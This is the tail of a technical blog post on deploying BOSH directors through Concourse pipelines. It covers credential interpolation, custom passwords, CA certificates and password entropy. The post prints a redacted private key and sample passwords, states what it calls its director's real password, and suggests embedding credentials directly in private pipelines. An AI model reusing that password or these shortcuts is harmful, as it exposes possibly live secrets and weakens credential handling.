and won&rsquo;t have the opportunity to gracefully bring itself down, for<code>bosh create-env</code> is relentless, brooks no delays, and gives no quarter.</p><p>On a more technical note, <code>bosh create-env</code>, although it will attempt to contact
the <a href=https://github.com/cloudfoundry/bosh-agent>BOSH agent</a> on the original
BOSH director in order to terminate the jobs and shut down the VM, it does not
run the <a href=https://bosh.io/docs/drain.html>drain scripts</a> (scripts which allow
the BOSH jobs to clean up and get into a state where they can be safely
stopped).</p><p>There is discussion within the BOSH development team whether to modify the
behavior of <code>bosh create-env</code> to make it run the drain scripts. On the positive
side, it will allow a more cavalier approach to re-deploying the director, and
make the behavior of <code>bosh create-env</code> more closely approximate the behavior of
a BOSH director. On the downside, the time to deploy a BOSH director may vary
widely, dependent on the time it takes for the drain scripts to complete.</p><p><a name=interpolation><sup>[Interpolation]</sup></a>
Our GitHub deploy key resembles the following (not our real key) <sup><a href=#ECC class=alert-link>[Elliptic-curve]</a></sup> :</p><pre tabindex=0><code>-----BEGIN EC PRIVATE KEY-----
MHcCAQEEIMxcR2wlxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxqY/VyDTL
AwEHoUQDQgAEmBUxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxjY98wOPVZ
Ayz++1vHXODWeiC/CjNu7hOVaB682ZZfCw==
-----END EC PRIVATE KEY-----
</code></pre><p>Concourse, when passed the flag <code>... -v github_deployments_key="$(lpass show --note github_deployments_key)"</code> will interpolate this section of
<code>pipeline.yml</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span><span style=color:#f92672>type</span>: <span style=color:#ae81ff>git</span>
</span></span><span style=display:flex><span><span style=color:#f92672>source</span>:
</span></span><span style=display:flex><span>  <span style=color:#f92672>uri</span>: <span style=color:#ae81ff>git@github.com:cunnie/deployments.git</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>private_key</span>: <span style=color:#ae81ff>((github_deployments_key))</span>
</span></span></code></pre></div><p>After interpolation, the pipeline looks like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span>- <span style=color:#f92672>name</span>: <span style=color:#ae81ff>cunnie-deployments</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>type</span>: <span style=color:#ae81ff>git</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>source</span>:
</span></span><span style=display:flex><span>    <span style=color:#f92672>uri</span>: <span style=color:#ae81ff>git@github.com:cunnie/deployments.git</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># previously: private_key: ((github_deployments_key))</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>private_key</span>: |<span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      -----BEGIN EC PRIVATE KEY-----
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      MHcCAQEEIMxcR2wlxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxqY/VyDTL
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      AwEHoUQDQgAEmBUxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxjY98wOPVZ
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      Ayz++1vHXODWeiC/CjNu7hOVaB682ZZfCw==
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      -----END EC PRIVATE KEY-----</span>      
</span></span></code></pre></div><p>If your pipeline is not public, it may be easier to <em>skip variable interpolation
and embed the credential(s) directly</em>.</p><p><a name=complicated><sup>[Why so complicated?]</sup></a>
Our Concourse task is complicated (i.e. <code>bosh.sh</code> calls <code>bosh-${IAAS}.sh</code>, calls
<code>bosh</code> CLI three times) because we have requirements beyond merely deploying a
BOSH director:</p><ul><li><p>We retain intermediate BOSH manifests (e.g.
<a href=https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/bosh-aws.yml><code>bosh-aws.yml</code></a>,
manifests that are completely populated with the exception of the secrets
(passwords, credentials, private keys). The sole purpose of the first <code>bosh interpolate</code> commands is to generate the intermediate manifest.<br><br>We
realize that our love of the intermediate manifests is not wholly rational:
time was when a working BOSH manifest was a precious thing, something to tend
to and to preserve. With the advent of <code>bosh-deployment</code>, which reliably
generates BOSH manifests, the intermediate manifests have diminished in
importance, and are now merely artifacts of a bygone age. And yet we still
cling to them, for they provide a sense of comfort, like a mother&rsquo;s hot apple
pie.</p></li><li><p>We prefer to set our own passwords rather than use the ones auto-generated
<sup><a href=#entropy class=alert-link>[auto-passwords]</a></sup> by the
BOSH CLI. This has two implications:</p><ul><li><p>It forces us to set the password variables in a counter-intuitive manner (e.g.
<code>bosh interpolate ... -v admin_password='((admin_password))' ...</code>) (which
says, in effect, &ldquo;replace all occurrences of &lsquo;((admin_password))&rsquo; with
&lsquo;((admin_password))&rsquo;.&rdquo;), which prevents the BOSH CLI from using its
auto-generated passwords and paves the way to subsequently interpolate our
passwords. This adds <a href=https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/bin/aws.sh#L42-L49>several
lines</a>
to our scripts.</p></li><li><p>It forces us to check to make sure that we haven&rsquo;t overlooked any variables
(i.e. we run <code>bosh interpolate --var-errs ...</code>), so that, for example, our
director&rsquo;s password is set to <code>IReturnedAndSawUnderTheSun</code> and not
<code>((admin_password))</code>). This adds <a href=https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/ci/tasks/bosh.sh#L17-L23>several more
lines</a>
to our scripts.</p></li></ul></li><li><p>Our BOSH director uses certificates issued by a recognized CA (<a href=https://en.wikipedia.org/wiki/Certificate_authority>Certificate
Authority</a>) (in our case,
<a href=https://en.wikipedia.org/wiki/Comodo_Group>Comodo</a>). This requires us to
create a manifest operations file (e.g.
<a href=https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/etc/aws.yml#L29-L41><code>etc/aws.yml</code></a>)
which we <a href=https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/bin/aws.sh#L24>pass to <code>bosh interpolate</code></a>
which overrides the auto-generated SSL certificate & key with our certificate &
key.</p></li><li><p>Some of our BOSH directors (e.g. bosh-aws.nono.io) are more than mere BOSH
directors — they are also nginx servers (web servers), DNS (Domain Name
System) servers, and NTP (Network Time Protocol) servers. This adds
<a href=https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/bin/aws.sh#L25-L27>three more
lines</a>
to our scripts.</p></li></ul><p>Note: one advantage of using CA-issued certificates and easy-to-remember
passwords is that it enables one to reach the BOSH director via the CLI without
needing the <code>creds.yml</code> file — one can sit at a new workstation, type <code>bosh -e bosh-gce.nono.io login</code>, and proceed to manage deployments, releases, stemcells,
etc&mldr;.</p><p><a name=entropy><sup>[auto-passwords]</sup></a> The BOSH CLI generates
<a href=https://en.wikipedia.org/wiki/Password_strength#Entropy_as_a_measure_of_password_strength>high-entropy</a>
passwords when <code>--vars-store</code> flag is passed.</p><p>Here is a list of sample passwords that <code>bosh create-env --vars-store=...</code> creates:</p><pre tabindex=0><code>admin_password: qn7hc6zsq0nphhsvojx3
blobstore_agent_password: iut5wdyeo5kkhvqoerj0
blobstore_director_password: wm0qgnzdwgy8k1hnm4nq
hm_password: plk829eob45khq6o9dl5
mbus_bootstrap_password: nf16h5e9j120uqp35hlr
nats_password: gr4s0xmj4s5iccqv69dt
postgres_password: 7nxuq714hxcta513778g
registry_password: ffxnhu4xtgh7lsxu7xpl
</code></pre><p>Note that the passwords are 20 bytes long and consist of random sequence of
numbers and lowercase letters. Each byte can be one of 36 possibilites (10
numbers plus 26 letters). Given that there are 20 bytes, the total number of
combinations is 36<sup>20</sup>, 1.33 x 10<sup>31</sup>, effectively rendering
the password immune to a brute-force attack (even if you could make a million
attempts every second, it would still require 4 × 10<sup>17</sup> years to
exhaust all combinations. In other words, you&rsquo;d crack the password long after
the <a href=https://en.wikipedia.org/wiki/The_Five_Ages_of_the_Universe#Stelliferous_Era>Stelliferous
Era</a>
ended and you were well into the <a href=https://en.wikipedia.org/wiki/The_Five_Ages_of_the_Universe#Degenerate_Era>Degenerate
Era</a>).</p><p><a name=ECC><sup>[Elliptic-curve]</sup></a>We use <a href=https://en.wikipedia.org/wiki/Elliptic-curve_cryptography>elliptic-curve
cryptography</a> (ECC)
keys, for they are much shorter than an RSA key of <a href=https://www.globalsign.com/en/blog/elliptic-curve-cryptography/>equivalent
strength</a>, and
thus more manageable. Unfortunately, they are not universally accepted (e.g. AWS
will respond with &ldquo;Error importing Key Pair Key is not in valid OpenSSH public
key format&rdquo; when importing an EC public key).</p><p>Where elliptic-curve cryptography is concerned, GitHub is ahead of the
proverbial curve, and AWS, behind.</p><h2 id=corrections--updates>Corrections & Updates<a hidden class=anchor aria-hidden=true href=#corrections--updates>#</a></h2><p><em>2017-12-01</em></p><p>We suggest simplifying the Concourse task script. The Concourse task script
executes the BOSH CLI three times (<code>bosh int</code> twice and <code>bosh create-env</code> once),
but need only execute it once (<code>bosh create-env</code>) when intermediate artifacts
aren&rsquo;t desired.</p><p><em>2017-11-25</em></p><p>David McClure pointed out that the OpenStack link was missing; it has been
added. Thanks, David.</p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://blog.nono.io/post/bosh-on-ipv6-2/><span class=title>« Prev</span><br><span>Deploying BOSH VMs with IPv6 Addresses on vSphere</span></a>
<a class=next href=https://blog.nono.io/post/bosh-ssl/><span class=title>Next »</span><br><span>Deploying a BOSH Director With SSL Certificates Issued by Commercial CA</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Maintaining BOSH Directors with Concourse CI and bosh-deployment on twitter" href="https://twitter.com/intent/tweet/?text=Maintaining%20BOSH%20Directors%20with%20Concourse%20CI%20and%20bosh-deployment&url=https%3a%2f%2fblog.nono.io%2fpost%2fbosh-deployed-with-concourse%2f&hashtags="><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Maintaining BOSH Directors with Concourse CI and bosh-deployment on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fblog.nono.io%2fpost%2fbosh-deployed-with-concourse%2f&title=Maintaining%20BOSH%20Directors%20with%20Concourse%20CI%20and%20bosh-deployment&summary=Maintaining%20BOSH%20Directors%20with%20Concourse%20CI%20and%20bosh-deployment&source=https%3a%2f%2fblog.nono.io%2fpost%2fbosh-deployed-with-concourse%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Maintaining BOSH Directors with Concourse CI and bosh-deployment on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fblog.nono.io%2fpost%2fbosh-deployed-with-concourse%2f&title=Maintaining%20BOSH%20Directors%20with%20Concourse%20CI%20and%20bosh-deployment"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Maintaining BOSH Directors with Concourse CI and bosh-deployment on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.nono.io%2fpost%2fbosh-deployed-with-concourse%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Maintaining BOSH Directors with Concourse CI and bosh-deployment on whatsapp" href="https://api.whatsapp.com/send?text=Maintaining%20BOSH%20Directors%20with%20Concourse%20CI%20and%20bosh-deployment%20-%20https%3a%2f%2fblog.nono.io%2fpost%2fbosh-deployed-with-concourse%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Maintaining BOSH Directors with Concourse CI and bosh-deployment on telegram" href="https://telegram.me/share/url?text=Maintaining%20BOSH%20Directors%20with%20Concourse%20CI%20and%20bosh-deployment&url=https%3a%2f%2fblog.nono.io%2fpost%2fbosh-deployed-with-concourse%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://blog.nono.io/>Brian Cunnie's Technical Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>